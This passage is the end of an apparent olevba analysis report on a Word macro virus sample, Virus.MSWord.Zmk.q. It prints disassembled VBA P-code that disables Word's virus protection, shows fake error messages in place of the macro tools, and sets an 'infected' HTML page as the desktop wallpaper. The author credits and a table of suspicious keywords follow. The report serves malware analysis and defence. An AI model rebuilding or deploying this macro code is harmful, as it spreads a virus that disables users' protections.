' 	LitStr 0x0007 "</HTML>"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #147:
' 	LitStr 0x000E "C:\ZMKHTML.htm"
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #148:
' 	ElseBlock 
' Line #149:
' 	LitStr 0x000E "C:\ZMKHTML.htm"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<HTML>"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<HEAD>"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "<TITLE>Virus ZMKHTML</TITLE>"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "<body bgcolor="red" >"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0086 "<p><font size="6"><strong><MARQUEE behavior="alternate">ATTENTION, VOTRE ORDINATEUR EST INFECTE PAR W97M/ZMKHTML.</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "<p>&nbsp;</p>"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006E "<p><font size="8"><strong><MARQUEE>BECAREFULL, YOUR COMPUTER IS INFECTED BY W97M/ZMKHTML.</MARQUEE></font></p>"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</body>"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</HTML>"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #171:
' 	LitStr 0x000E "C:\ZMKHTML.htm"
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	Label Fin 
' Line #174:
' 	Label ErrorFEx 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub ToolsMacro())
' Line #177:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #178:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #179:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #180:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #181:
' 	OnError ErrorToolM 
' 	BoS 0x0000 
' Line #182:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0013 "Français (standard)"
' 	Eq 
' 	IfBlock 
' Line #183:
' 	LitStr 0x002D "Une erreur interne à ce programme est survenu"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001C "Veuillez réessayer plus tard"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #184:
' 	ElseBlock 
' Line #185:
' 	LitStr 0x002B "A internal error in this program is occured"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000B "Retry later"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #186:
' 	EndIfBlock 
' Line #187:
' 	Label ErrorToolM 
' Line #188:
' 	EndSub 
' Line #189:
' 	FuncDefn (Sub ViewVBCode())
' Line #190:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #191:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #192:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #193:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #194:
' 	OnError ErrorViewVBC 
' 	BoS 0x0000 
' Line #195:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0013 "Français (standard)"
' 	Eq 
' 	IfBlock 
' Line #196:
' 	LitStr 0x0029 "Ce module de programme n'est pas installé"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0022 "Veuillez consulter l'aide en ligne"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #197:
' 	ElseBlock 
' Line #198:
' 	LitStr 0x0024 "This program module is not installed"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001B "Please see the help on line"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	Label ErrorViewVBC 
' Line #201:
' 	EndSub 
' Line #202:
' Macros/VBA/About - 3212 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	Ld About 
' 	ArgsCall Unlock 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #4:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	EndSub 
' Macros/VBA/Propos - 2889 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	Ld Propos 
' 	ArgsCall Unlock 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This virii was created by the best macro virii author:11u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Greetz to all members of [SOS] Sign Of ScreamZJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce virus a �t� cr�� par le meilleur auteur de macros virus:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Merci � tous les membres de [SOS] Sign Of Scream�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

